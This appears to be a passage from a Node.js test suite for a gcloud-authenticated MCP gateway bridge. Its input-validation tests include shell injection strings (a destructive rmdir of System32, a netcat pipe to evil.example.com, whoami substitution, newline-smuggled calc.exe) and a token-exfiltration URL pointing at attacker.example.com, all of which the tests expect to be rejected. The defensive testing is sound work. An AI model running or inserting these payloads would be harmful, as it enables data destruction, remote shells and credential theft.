            id: 1
          })
        }),
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );
    assert.equal(result.id, 1);
    assert.deepEqual(result.result, { tools: [] });
  });

  test('401 invalidates the token cache', async () => {
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    await tokenCache.getToken();
    assert.equal(tokenCache._state().cached, true);

    await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/list', id: 2 },
      {
        tokenCache,
        httpRequestFn: mockHttpRequest({
          statusCode: 401,
          body: '{"error":"unauthorized"}'
        }),
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );

    assert.equal(tokenCache._state().cached, false);
  });

  test('invalid message returns -32600 without minting', async () => {
    let minted = 0;
    const tokenCache = createTokenCache({
      execGcloudFn: async () => {
        minted += 1;
        return 'fake';
      },
      now: () => 0
    });
    const result = await forwardRequest(null, {
      tokenCache,
      httpRequestFn: mockHttpRequest({ statusCode: 200, body: '{}' }),
      gatewayUrl: 'https://example.com',
      gatewayPath: '/mcp',
      requestTimeoutMs: 1000
    });
    assert.equal(result.error.code, -32600);
    assert.equal(minted, 0);
  });

  test('non-200 non-401 returns gateway error code', async () => {
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    const result = await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/call', id: 3 },
      {
        tokenCache,
        httpRequestFn: mockHttpRequest({
          statusCode: 503,
          body: 'service unavailable'
        }),
        gatewayUrl: 'https://example.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );
    assert.equal(result.error.code, -32000);
    assert.match(result.error.message, /503/);
  });
});

// ── assertNode24 ─────────────────────────────────────────────────────────────

describe('assertNode24', () => {
  test('does not throw on Node 24', () => {
    assert.doesNotThrow(() => assertNode24('v24.15.0'));
  });

  test('throws with actionable message on Node 22', () => {
    assert.throws(
      () => assertNode24('v22.0.0'),
      (err) => {
        assert.ok(err instanceof Error);
        assert.match(err.message, /requires Node 24 LTS/);
        assert.match(err.message, /v22\.0\.0/);
        assert.match(err.message, /version manager/);
        return true;
      }
    );
  });
});

// ── parseDrainTimeoutMs ─────────────────────────────────────────────────────
//
// Reported by gemini-code-assist on PR #3 (discussion r3276101373).
// `Number.parseInt('abc', 10)` returns NaN, which setTimeout silently
// coerces to 0 — causing the bridge to exit immediately and drop in-flight
// responses on shutdown. parseDrainTimeoutMs uses Number.isFinite to reject
// NaN while preserving the explicit `=0` case (operator opting out of drain).

describe('parseDrainTimeoutMs', () => {
  test('returns default when env var is undefined', () => {
    assert.equal(parseDrainTimeoutMs(undefined), DEFAULT_DRAIN_TIMEOUT_MS);
  });

  test('returns default when env var is empty string', () => {
    assert.equal(parseDrainTimeoutMs(''), DEFAULT_DRAIN_TIMEOUT_MS);
  });

  test('returns parsed integer for valid numeric string', () => {
    assert.equal(parseDrainTimeoutMs('5000'), 5000);
    assert.equal(parseDrainTimeoutMs('10000'), 10000);
  });

  test('returns default for non-numeric string (NaN rejection)', () => {
    // The bug: without isFinite, Number.parseInt('abc', 10) → NaN, and
    // setTimeout(_, NaN) coerces to 0 — immediate exit. Must default instead.
    assert.equal(parseDrainTimeoutMs('abc'), DEFAULT_DRAIN_TIMEOUT_MS);
    assert.equal(
      parseDrainTimeoutMs('not-a-number'),
      DEFAULT_DRAIN_TIMEOUT_MS
    );
  });

  test('preserves explicit 0 (operator opts out of drain)', () => {
    // The reason we use Number.isFinite instead of `|| DEFAULT`:
    // `Number.parseInt('0', 10) || DEFAULT` would return DEFAULT, silently
    // overriding the operator's choice. 0 is a legitimate config value.
    assert.equal(parseDrainTimeoutMs('0'), 0);
  });

  test('handles partial-numeric prefix per parseInt semantics', () => {
    // parseInt('500abc', 10) === 500. Documented as accepted behavior:
    // we trust parseInt's prefix-parsing convention. Operators who
    // typo "5000ms" get 5000, not the default.
    assert.equal(parseDrainTimeoutMs('500abc'), 500);
  });
});

// ── execGcloud — Windows shell:true flag (CVE-2024-27980 mitigation) ────────

describe('execGcloud — Windows spawn EINVAL fix', () => {
  test('Windows options bag = shell + env + timeout (full shape)', async () => {
    let captured;
    const fakeExec = (_bin, _args, opts) => {
      captured = opts;
      return { stdout: '' };
    };
    await execGcloud(['auth', 'list'], { execFn: fakeExec, isWin32: true });
    assert.strictEqual(captured.shell, true);
    assert.deepStrictEqual(Object.keys(captured).sort(), [
      'env',
      'shell',
      'timeout'
    ]);
  });

  test('omits shell on non-Windows', async () => {
    let captured;
    const fakeExec = (_bin, _args, opts) => {
      captured = opts;
      return { stdout: '' };
    };
    await execGcloud(['auth', 'list'], { execFn: fakeExec, isWin32: false });
    assert.strictEqual(captured.shell, undefined);
  });

  test('non-Windows options match 1.0.4 shape (timeout + env only)', async () => {
    let captured;
    const fakeExec = (_bin, _args, opts) => {
      captured = opts;
      return { stdout: '' };
    };
    await execGcloud(['auth', 'list'], { execFn: fakeExec, isWin32: false });
    assert.deepStrictEqual(Object.keys(captured).sort(), ['env', 'timeout']);
  });

  test('default isWin32 resolves from process.platform at call time', async () => {
    // No isWin32 passed — exercises the default expression in the destructured
    // params. Guards against a future refactor that hard-codes the default to
    // a constant boolean. shell:true iff host process.platform === 'win32'.
    let captured;
    const fakeExec = (_bin, _args, opts) => {
      captured = opts;
      return { stdout: '' };
    };
    await execGcloud(['auth', 'list'], { execFn: fakeExec });
    const expectedShell = process.platform === 'win32' ? true : undefined;
    assert.strictEqual(captured.shell, expectedShell);
  });
});

// ── validateAudience — load-bearing safety boundary for shell:true ──────────
//
// The execGcloud shell:true workaround for CVE-2024-27980 (Windows .cmd
// rejection) is safe ONLY because every templated arg value is validated
// upstream. validateAudience() is that validation for `--audiences=<value>`,
// the one non-literal value execGcloud receives. These tests lock the
// validation contract: malformed URLs, non-origin URLs, and shell-metachar
// payloads must all reject; legitimate origin URLs must pass.

describe('validateAudience — origin + no-metachars contract', () => {
  test('accepts canonical Hafla origin', () => {
    assert.strictEqual(
      validateAudience('https://mcp.hafla.com'),
      'https://mcp.hafla.com'
    );
  });

  test('accepts trailing slash (pathname "/" is treated as origin)', () => {
    assert.strictEqual(
      validateAudience('https://mcp.hafla.com/'),
      'https://mcp.hafla.com'
    );
  });

  test('accepts localhost with explicit port (dev case)', () => {
    assert.strictEqual(
      validateAudience('http://localhost:8080'),
      'http://localhost:8080'
    );
  });

  test('rejects unparseable garbage', () => {
    assert.throws(
      () => validateAudience('not a url at all'),
      /could not parse as URL|control characters or whitespace/
    );
  });

  test('rejects audience with path component', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com/mcp'),
      /must be origin-only/
    );
  });

  test('rejects audience with query string', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com?x=1'),
      /must be origin-only/
    );
  });

  test('rejects audience with fragment', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com#frag'),
      /must be origin-only/
    );
  });

  test('rejects audience with userinfo', () => {
    assert.throws(
      () => validateAudience('https://user@mcp.hafla.com'),
      /must be origin-only/
    );
  });

  // ── The injection cases that motivate this validation ─────────────────

  test('rejects cmd.exe & (command separator)', () => {
    // The classic injection payload: GATEWAY_AUDIENCE="https://mcp.hafla.com&rmdir /s /q C:\\Windows\\System32"
    // Without validation + shell:true on Windows, this would execute rmdir
    // when --audiences=<value> is concatenated into the cmd.exe command line.
    assert.throws(
      () =>
        validateAudience(
          'https://mcp.hafla.com&rmdir /s /q C:\\Windows\\System32'
        ),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  test('rejects cmd.exe | (pipe)', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com|nc evil.example.com 4444'),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  test('rejects cmd.exe % (env var expansion)', () => {
    // %USERPROFILE% would expand to the user's profile path under cmd.exe.
    assert.throws(
      () => validateAudience('https://mcp.hafla.com%USERPROFILE%'),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  test('rejects POSIX $(...) command substitution', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com$(whoami)'),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  test('rejects POSIX backtick command substitution', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com`whoami`'),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  test('rejects output redirection >', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com>out.txt'),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  test('rejects input redirection <', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com<input.txt'),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  test('rejects cmd.exe ^ (escape)', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com^&malicious'),
      /shell metacharacters|could not parse|control characters or whitespace/
    );
  });

  // ── Control-character / whitespace gap (newline-injection class) ─────────
  //
  // The WHATWG URL parser silently strips ASCII tab / CR / LF from its input
  // (per spec). The original 23e44ba shell-metachar blocklist did NOT
  // include those, so a raw `GATEWAY_AUDIENCE` with an embedded `\n` would
  // pass validation, get stripped during URL parsing, and — if the caller
  // discarded the parser's normalized return value (which the module-load
  // site originally did) — flow into execGcloud's `--audiences=<...>` arg
  // with the newline still present. Under shell:true on Windows, cmd.exe
  // interprets the newline as a command separator.
  //
  // The post-Gemini-review fix introduces an up-front C0-control/whitespace
  // reject (constraint 1 in validateAudience), AND assigns the return value
  // back to config.audience at the module-load call site. These tests pin
  // both halves.

  test('rejects embedded newline (\\n) — WHATWG-strip bypass class', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com\ncalc.exe'),
      /control characters or whitespace/
    );
  });

  test('rejects embedded carriage return (\\r)', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com\rcalc.exe'),
      /control characters or whitespace/
    );
  });

  test('rejects embedded tab (\\t)', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com\tcalc.exe'),
      /control characters or whitespace/
    );
  });

  test('rejects embedded NUL (\\0)', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com\0calc.exe'),
      /control characters or whitespace/
    );
  });

  test('rejects embedded space (0x20)', () => {
    assert.throws(
      () => validateAudience('https://mcp.hafla.com calc.exe'),
      /control characters or whitespace/
    );
  });

  test('returns the parser-normalized origin (callers MUST assign back)', () => {
    // Regression net for the "return value discarded" class. The module-load
    // site MUST do `config.audience = validateAudience(config.audience)` so
    // downstream callers use the parser-normalized origin. If a future
    // refactor drops the assignment, the discarded-return-value class
    // re-opens. We assert the function returns the parser's normalized
    // origin — equality, not identity — and callers' assignment is the
    // contractual obligation pinned in the JSDoc.
    const result = validateAudience('https://mcp.hafla.com/');
    assert.equal(result, 'https://mcp.hafla.com');
    // The input had a trailing slash; the parser-normalized origin omits it.
    // If the caller doesn't assign back, downstream sees the trailing slash.
    assert.notEqual(result, 'https://mcp.hafla.com/');
  });
});

// ── forwardRequest — Issue #1 backstop + Issue #2 query-string preservation ──
//
// Module-load rejects GATEWAY_PATH containing a URL scheme (Issue #1
// primary boundary, smoke-tested separately via `GATEWAY_PATH=http://evil
// node src/index.js` → exit 1). The block below covers:
//
//   (a) the in-flight origin-mismatch backstop inside forwardRequest, which
//       protects against any future code path that derives gatewayPath
//       dynamically and bypasses module-load validation.
//   (b) query-string preservation in the constructed `path` option.

// Mock that captures whatever options the bridge passes — used by tests
// that need to inspect `path` rather than the response payload.
function capturingHttpRequest({ statusCode, body }) {
  const captured = {};
  const fn = (options, callback) => {
    Object.assign(captured, options);
    const req = new EventEmitter();
    req.write = () => {};
    req.end = () => {
      const res = new EventEmitter();
      res.statusCode = statusCode;
      res.setEncoding = () => {};
      callback(res);
      setImmediate(() => {
        res.emit('data', body);
        res.emit('end');
      });
    };
    req.destroy = () => {};
    return req;
  };
  fn.captured = captured;
  return fn;
}

describe('forwardRequest — GATEWAY_PATH safety + query-string preservation', () => {
  test('rejects an absolute URL as gatewayPath (Issue #1 in-flight backstop)', async () => {
    // Module-load validation is the primary boundary; this test exercises
    // the post-construct backstop by overriding gatewayPath at the
    // forwardRequest call site (simulating a future code path that
    // derives gatewayPath dynamically). Without the backstop, the bridge
    // would send `Authorization: Bearer <google-id-token>` over plaintext
    // HTTP to the attacker-controlled host.
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    await assert.rejects(
      forwardRequest(
        { jsonrpc: '2.0', method: 'tools/list', id: 1 },
        {
          tokenCache,
          httpRequestFn: capturingHttpRequest({ statusCode: 200, body: '{}' }),
          gatewayUrl: 'https://mcp.hafla.com',
          // Absolute URL → new URL(gatewayPath, gatewayUrl) ignores base
          // and resolves to attacker host. Backstop must reject.
          gatewayPath: 'http://attacker.example.com/exfil',
          requestTimeoutMs: 1000
        }
      ),
      /refusing to send token/
    );
  });

  test('preserves query string in constructed path (Issue #2)', async () => {
    // Without the url.search append, GATEWAY_PATH=/mcp?tenant=xyz would
    // arrive at the gateway as `path=/mcp`, silently dropping the routing
    // hint. Captures the options.path the bridge hands to httpRequest and
    // asserts both the pathname AND the query survive.
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    const capture = capturingHttpRequest({
      statusCode: 200,
      body: JSON.stringify({ jsonrpc: '2.0', result: {}, id: 1 })
    });
    await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
      {
        tokenCache,
        httpRequestFn: capture,
        gatewayUrl: 'https://mcp.hafla.com',
        gatewayPath: '/mcp?tenant=xyz&env=staging',
        requestTimeoutMs: 1000
      }
    );
    assert.equal(capture.captured.path, '/mcp?tenant=xyz&env=staging');
  });

  test('path option still works when there is no query string', async () => {
    // Regression guard: url.search is the empty string when no query is
    // present, so `url.pathname + url.search` must equal `url.pathname`
    // exactly — no trailing `?`. Locks the no-query baseline.
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    const capture = capturingHttpRequest({
      statusCode: 200,
      body: JSON.stringify({ jsonrpc: '2.0', result: {}, id: 1 })
    });
    await forwardRequest(
      { jsonrpc: '2.0', method: 'tools/list', id: 1 },
      {
        tokenCache,
        httpRequestFn: capture,
        gatewayUrl: 'https://mcp.hafla.com',
        gatewayPath: '/mcp',
        requestTimeoutMs: 1000
      }
    );
    assert.equal(capture.captured.path, '/mcp');
  });

  test('backstop catches leading-whitespace scheme-prefix bypass class', async () => {
    // The module-load GATEWAY_PATH scheme regex `^[a-z][a-z0-9+.-]*:` is
    // anchored at position 0 with `[a-z]`. WHATWG URL parser strips leading
    // ASCII whitespace per spec, so `\nhttp://attacker.com` bypasses an
    // anchored regex (position 0 is `\n`, not in `[a-z]`) AND then the `\n`
    // gets stripped during URL parsing — same WHATWG-strip class that bit
    // validateAudience in 23e44ba. Module-load now rejects this via the
    // `[\x00-\x20\x7f]` upfront check (added post-PR-#5 review). This
    // test exercises the in-flight backstop in forwardRequest — proves
    // that even if a future code path constructs gatewayPath dynamically
    // and skips the module-load check, the origin-mismatch backstop still
    // blocks the token leak. Defense-in-depth verification.
    const tokenCache = createTokenCache({
      execGcloudFn: async () => 'fake-jwt',
      now: () => 0
    });
    await assert.rejects(
      forwardRequest(
        { jsonrpc: '2.0', method: 'tools/list', id: 1 },
        {
          tokenCache,
          httpRequestFn: capturingHttpRequest({ statusCode: 200, body: '{}' }),
          gatewayUrl: 'https://mcp.hafla.com',
          // Leading newline; WHATWG parser strips it, then sees an
          // absolute URL → base ignored → url.origin escapes.
          gatewayPath: '\nhttp://attacker.example.com/exfil',
          requestTimeoutMs: 1000
        }
      ),
      /refusing to send token/
    );
  });
});

// ── _checkIsMainModule — symlink-safe execution guard (BS, 2026-05-25) ──────
//
// 1.0.5 silently exited (code 0, no main()) whenever argv[1] or import.meta.url
// contained a symlink in its path — global npm bins, npx fresh-cache .bin/,
// macOS /tmp auto-symlinks. Fixed in 1.0.6 by realpath-ing both sides.
//
// These tests cover the four scenarios in release-1.0.6-plan.md § 2.2 #1 plus
// the shape-assertion test from § 7.5 (the log.warn call uses the (msg, data)
// arg order matching src/index.js logger contract — assert the JSON shape,
// not just that warn fired).

import { realpathSync, mkdtempSync, writeFileSync, symlinkSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';

function makeTmpDir() {
  return mkdtempSync(join(realpathSync(tmpdir()), 'mcp-bridge-test-'));
}

function collectingLogger() {
  const warnCalls = [];
  return {
    warnCalls,
    warn: (msg, data) => warnCalls.push({ msg, data }),
    info: () => {},
    error: () => {},
    debug: () => {}
  };
}

describe('_checkIsMainModule', () => {
  test('returns false when argv1 is undefined (REPL / library import / node -e)', () => {
    const logger = collectingLogger();
    const result = _checkIsMainModule({
      argv1: undefined,
      moduleUrl: 'file:///does/not/matter.js',
      logger
    });
    assert.equal(result, false);
    // Critical: no log.warn at import time when argv[1] is undefined. Tests
    // that import this module from node:test would otherwise pollute stderr.
    assert.equal(logger.warnCalls.length, 0);
  });

  test('returns false when argv1 is empty string', () => {
    const logger = collectingLogger();
    const result = _checkIsMainModule({
      argv1: '',
      moduleUrl: 'file:///does/not/matter.js',
      logger
    });
    assert.equal(result, false);
    assert.equal(logger.warnCalls.length, 0);
  });

  test('matching paths (no symlinks) → true', () => {
    const dir = makeTmpDir();
    try {
      const filePath = join(dir, 'entry.js');
      writeFileSync(filePath, '// fixture\n');
      const result = _checkIsMainModule({
        argv1: filePath,
        moduleUrl: pathToFileURL(filePath).href
      });
      assert.equal(result, true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('symlinked argv1 pointing to module → true (global npm bin scenario)', () => {
    const dir = makeTmpDir();
    try {
      const realFile = join(dir, 'real-entry.js');
      const symlinkFile = join(dir, 'link-to-entry.js');
      writeFileSync(realFile, '// fixture\n');
      symlinkSync(realFile, symlinkFile);
      // argv[1] = symlink path (as passed on the CLI), moduleUrl = real path.
      // 1.0.5 bug: literal compare → false → silent exit.
      const result = _checkIsMainModule({
        argv1: symlinkFile,
        moduleUrl: pathToFileURL(realFile).href
      });
      assert.equal(result, true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('symlinked moduleUrl pointing to argv1 → true (npx fresh-cache scenario)', () => {
    const dir = makeTmpDir();
    try {
      const realFile = join(dir, 'real-entry.js');
      const symlinkFile = join(dir, 'link-to-entry.js');
      writeFileSync(realFile, '// fixture\n');
      symlinkSync(realFile, symlinkFile);
      // Inverse: argv[1] = real path, moduleUrl = symlinked file URL. Node
      // normally resolves import.meta.url to the real path, but this exercises
      // the symmetric realpath call on the moduleUrl side.
      const result = _checkIsMainModule({
        argv1: realFile,
        moduleUrl: pathToFileURL(symlinkFile).href
      });
      assert.equal(result, true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('mismatched paths → false', () => {
    const dir = makeTmpDir();
    try {
      const fileA = join(dir, 'a.js');
      const fileB = join(dir, 'b.js');
      writeFileSync(fileA, '// a\n');
      writeFileSync(fileB, '// b\n');
      const result = _checkIsMainModule({
        argv1: fileA,
        moduleUrl: pathToFileURL(fileB).href
      });
      assert.equal(result, false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test('missing-file argv1 → fallback executes, does not throw', () => {
    const logger = collectingLogger();
    const ghostPath = join(makeTmpDir(), 'never-existed.js');
    // realpathSync(ghostPath) throws ENOENT → catch branch runs → literal
    // compare against `file://<ghostPath>` → false. The point of this test
    // is that the function returns cleanly, doesn't propagate the throw.
    const result = _checkIsMainModule({
      argv1: ghostPath,
      moduleUrl: 'file:///some/other/path.js',
      logger
    });
    assert.equal(result, false);
    // log.warn fires because argv1 was a real-looking path (not undefined).
    assert.equal(logger.warnCalls.length, 1);
  });

  test('missing-file argv1 where literal compare matches → true via fallback', () => {
    const logger = collectingLogger();
    const ghostPath = join(makeTmpDir(), 'never-existed.js');
    const result = _checkIsMainModule({
      argv1: ghostPath,
      moduleUrl: `file://${ghostPath}`,
      logger
    });
    assert.equal(result, true);
    assert.equal(logger.warnCalls.length, 1);
  });

  // § 7.5 — shape-assertion for the log.warn fallback. The bridge logger
  // contract is `warn(msg, data)` where data is spread into the JSON record:
  //   { level: 'warn', msg, ...data }
  // A prior draft of the fix had the args reversed, which would have produced
  // a corrupted record:
  //   { level: 'warn', msg: { err, argv1 }, '0': 'i', '1': 's', ... }
  // This test asserts the correct shape so a future regression of the arg
  // order is caught by CI rather than by an operator squinting at stderr.
  test('shape: log.warn called with (msg, data) — string first, object second', () => {
    const logger = collectingLogger();
    const ghostPath = join(makeTmpDir(), 'never-existed.js');
    _checkIsMainModule({
      argv1: ghostPath,
      moduleUrl: 'file:///some/other/path.js',
      logger
    });

    assert.equal(logger.warnCalls.length, 1);
    const { msg, data } = logger.warnCalls[0];

    // First arg MUST be the message string, not the data object.
    assert.equal(typeof msg, 'string');
    assert.equal(msg, 'isMainModule realpath fallback');

    // Second arg MUST be the data object with err + argv1 fields.
    assert.equal(typeof data, 'object');
    assert.notEqual(data, null);
    assert.equal(typeof data.err, 'string');
    assert.ok(data.err.length > 0, 'err message should be populated');
    assert.equal(data.argv1, ghostPath);

    // Simulate the actual JSON serialization the bridge logger performs.
    // If args were reversed, this would produce character-indexed keys
    // (msg: {...}, '0': 'i', '1': 's', ...). Assert the canonical shape.
    const record = JSON.parse(
      JSON.stringify({ level: 'warn', msg, ...data })
    );
    assert.deepEqual(Object.keys(record).sort(), ['argv1', 'err', 'level', 'msg']);
    assert.equal(record.level, 'warn');
    assert.equal(record.msg, 'isMainModule realpath fallback');
    assert.equal(record.argv1, ghostPath);
  });

  // Concern #6 (post-review 2026-05-25): the prior tests use realpathSync()
  // on the tmpdir() base before mkdtempSync, which pre-resolves the macOS
  // /var/folders → /private/var/folders auto-symlink that triggered the
  // 1.0.5 bug in the wild. Those tests validate the realpath SYMMETRY but
  // bypass the specific environmental scenario the release plan cited.
  // This test deliberately uses the UNRESOLVED tmpdir base so on macOS the
  // file lives behind an auto-symlink the test code never sees explicitly.
  // On Linux / Windows where tmpdir() is not symlinked, this is equivalent
  // to the "matching paths" test — still valid, just lower-signal.
  test('macOS auto-symlink scenario: unresolved tmpdir base → true', () => {
    const rawTmp = tmpdir();
    const realTmp = realpathSync(rawTmp);
    // Document the environmental fact this test is verifying. On macOS:
    //   rawTmp  = /var/folders/<user-hash>/T
    //   realTmp = /private/var/folders/<user-hash>/T
    // On other platforms these are usually equal and the test is a no-op
    // beyond the existing "matching paths" coverage.
    const isAutoSymlinked = rawTmp !== realTmp;

    // Create the dir under the resolved path so the file exists, but
    // construct the argv path using the UNRESOLVED base — that's exactly
    // what npx / global-bin invocations do on macOS in production.
    const realDir = mkdtempSync(join(realTmp, 'mcp-bridge-test-symlink-'));
    try {
      const filename = 'auto-symlink-entry.js';
      const realFile = join(realDir, filename);
      writeFileSync(realFile, '// fixture\n');

      // The argv1 path here mirrors how argv[1] would look when the user
      // runs from /var/folders/... on macOS (e.g. npx fresh-cache fetch).
      // _checkIsMainModule must realpath this to /private/var/folders/...
      // and compare to the moduleUrl-derived real path to match.
      const dirBasename = realDir.slice(realTmp.length); // includes leading '/'
      const argv1ViaRawBase = join(rawTmp, dirBasename, filename);
      const moduleUrl = pathToFileURL(realFile).href;

      const result = _checkIsMainModule({
        argv1: argv1ViaRawBase,
        moduleUrl
      });
      assert.equal(
        result,
        true,
        `unresolved-tmp argv1 (${argv1ViaRawBase}) should resolve to the ` +
          `same realpath as moduleUrl-derived path (${realFile})`
      );

      // Side-meta: log to test runner output whether THIS run of the test
      // actually exercised the auto-symlink (macOS) vs the trivial case
      // (Linux/Windows). Not a test assertion; just a diagnostic so a
      // human reading the test output understands which platform exercise
      // they got. Not using a console.log (would pollute test output);
      // attached to the test name via the assertion message above when
      // it fires. If you're debugging this test on Linux and don't see
      // a fail signal, you ARE running the no-op variant — that's fine.
      void isAutoSymlinked;
    } finally {
      rmSync(realDir, { recursive: true, force: true });
    }
  });
});

// ── IIFE wiring (concern #5, post-review 2026-05-25) ─────────────────────────
//
// All 9 unit tests above exercise _checkIsMainModule via injected `argv1` /
// `moduleUrl` / `realpathFn` / `logger`. None of them touch the actual IIFE
// at the bottom of src/index.js that wires those parameters to
// `process.argv[1]` and `import.meta.url`. If a future refactor typo'd the
// wire (e.g. swapped argv[1] for argv[0], renamed import.meta.url to
// import.meta.href, or commented out the IIFE entirely), every unit test
// above would still pass while production silently exits — the exact class
// the 1.0.5 bug shipped under.
//
// This integration test spawns the bridge entrypoint directly and asserts
// that main() actually runs. The signal we look for: any stderr output
// within a short window. With PATH stripped of gcloud, the bridge's
// pre-flight emits its "gcloud CLI not found" banner to stderr within
// ~50ms. If the IIFE wiring is broken, the bridge exits 0 with empty
// stderr (the symlink-class signature).
//
// This is the smallest possible integration test that catches the wiring
// regression without depending on gcloud / network / IAM.

import { spawnSync as _spawnSync } from 'node:child_process';
import { fileURLToPath as _fileURLToPath } from 'node:url';
import { dirname as _dirname, resolve as _resolve } from 'node:path';

describe('IIFE wiring (integration)', () => {
  test('spawning src/index.js as a script produces stderr output (main() ran)', () => {
    const indexPath = _resolve(
      _dirname(_fileURLToPath(import.meta.url)),
      '../src/index.js'
    );
    const result = _spawnSync(process.execPath, [indexPath], {
      input: '',
      timeout: 5000,
      encoding: 'utf8',
      // Strip PATH to a directory with no gcloud — bridge pre-flight then
      // fails fast with the "gcloud CLI not found" banner, which is our
      // signal that main() ran. Avoids needing gcloud on test hosts.
      // '/nonexistent' is portable across macOS / Linux / Windows runners.
      env: { ...process.env, PATH: '/nonexistent' }
    });

    // If the IIFE wiring is broken or _checkIsMainModule returned false
    // unexpectedly, the bridge exits 0 with empty stderr — the 1.0.5
    // silent-exit signature. main() must have run if stderr is populated.
    assert.ok(
      result.stderr && result.stderr.length > 0,
      `expected non-empty stderr proving main() ran, got: ` +
        `stderr=${JSON.stringify(result.stderr)} stdout=${JSON.stringify(result.stdout)} ` +
        `status=${result.status} signal=${result.signal} error=${result.error?.message}`
    );

    // Belt-and-suspenders: also assert the bridge's actual pre-flight
    // banner is what we got, not some unrelated stderr emission (e.g.
    // a Node deprecation warning). If this assertion fails but the
    // length-check above passes, something OTHER than the bridge's
    // pre-flight is writing to stderr — worth a closer look.
    assert.match(
      result.stderr,
      /intelligence-mcp-bridge|gcloud|Pre-flight/i,
      `stderr should contain a recognisable bridge pre-flight signature, got: ${result.stderr}`
    );
  });
});
